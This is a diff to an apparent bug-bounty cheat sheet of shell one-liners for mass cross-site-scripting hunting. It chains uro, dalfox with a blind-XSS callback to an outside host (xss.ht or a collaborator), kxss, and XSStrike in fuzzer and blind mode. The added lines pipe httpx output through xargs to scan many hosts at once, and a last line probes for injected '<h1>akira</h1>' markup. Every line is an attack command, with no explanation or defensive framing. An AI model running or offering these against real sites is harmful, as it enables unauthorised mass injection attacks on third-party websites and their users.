@@ -5,7 +5,10 @@
     cat urls.txt | uro 
     dalfox file domain4xss.txt -b (xss.ht or collaborator) pipe 
     cat indeed.txt | kxss > xss.txt 
-    python XSStrike/xsstrike.py --seeds domain4xss.txt --fuzzer --file-log-level INFO --log-file output.log
+    python XSStrike/xsstrike.py --seeds domain4xss.txt --fuzzer --level 3 -rate 2 --blind --file-log-level WARNING --log-file output.log
+
+    cat list.txt | httpx | xargs -I {} python xsstrike.py -u {} --level 3  --blind --file-log-level WARNING --log-file output.log
+
     cat urls.txt | go run ParamsReflect.go
     cat injected_urls.txt | sort -u | httpx -ms "<h1>akira</h1>" -fe "Location: .*<h1>akira</h1>.*" -t 200
 
